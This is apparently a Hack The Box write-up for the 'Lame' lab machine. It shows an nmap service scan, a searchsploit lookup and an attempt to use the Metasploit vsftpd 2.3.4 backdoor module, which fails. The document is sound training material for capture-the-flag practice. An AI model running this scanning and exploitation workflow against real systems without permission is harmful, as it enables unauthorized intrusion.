# htb-lame
This is my [Hack the box](https://www.hackthebox.eu/)'s Lame machine write-up.

## Machine
OS: GNU/Linux

IP: 10.10.10.3

Level: Easy

## Scan
```bash
nmap -sC -sV -A -oN lame.nmap 10.10.10.3
```

```
Nmap scan report for 10.10.10.3
Host is up (0.042s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.36
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: broadband router|remote management|WAP|printer|general purpose|power-device
Running (JUST GUESSING): Arris embedded (92%), Dell embedded (92%), Linksys embedded (92%), Tranzeo embedded (92%), Xerox embedded (92%), Linux 2.4.X|2.6.X (92%), Dell iDRAC 6 (92%), Raritan embedded (92%)
OS CPE: cpe:/h:dell:remote_access_card:6 cpe:/h:linksys:wet54gs5 cpe:/h:tranzeo:tr-cpq-19f cpe:/h:xerox:workcentre_pro_265 cpe:/o:linux:linux_kernel:2.4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:dell:idrac6_firmware
Aggressive OS guesses: Arris TG862G/CT cable modem (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Linux 2.6.8 - 2.6.30 (92%), Dell iDRAC 6 remote access controller (Linux 2.6) (92%), Raritan Dominion PX DPXR20-20L power control unit (92%), LifeSize video conferencing system (Linux 2.4.21) (92%), DD-WRT v24-sp1 (Linux 2.4.36) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2d22h55m32s, deviation: 0s, median: -2d22h55m32s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-05-20T03:07:08-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   56.81 ms 10.10.14.1
2   56.90 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat May 23 06:03:20 2020 -- 1 IP address (1 host up) scanned in 62.87 seconds
```

## FTP service
Let's start with the FTP service. First, search for exploits using [searchsploit](https://github.com/offensive-security/exploitdb):
```bash
root@kali:~/htb/lame# searchsploit vsftpd 2.3.4
---------------------------------- ----------------------------------------
 Exploit Title                    |  Path
                                  | (/usr/share/exploitdb/)
---------------------------------- ----------------------------------------
vsftpd 2.3.4 - Backdoor Command E | exploits/unix/remote/17491.rb
---------------------------------- ----------------------------------------
Shellcodes: No Result
```

This may be interesting. Use metasploit to get more information:
```bash
root@kali:~/htb/lame# metasploit

msf > search vsftpd 2.3.4
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                                      Disclosure Date  Rank       Description
   ----                                                      ---------------  ----       -----------
   auxiliary/gather/teamtalk_creds                                            normal     TeamTalk Gather Credentials
   exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  osCommerce Installer Unauthenticated Code Execution
   exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Apache Struts 2 Namespace Redirect OGNL Injection
   exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution
```

Try to exploit the backdoor:
```bash
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
   
msf exploit(unix/ftp/vsftpd_234_backdoor) > exploit
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
No luck here.


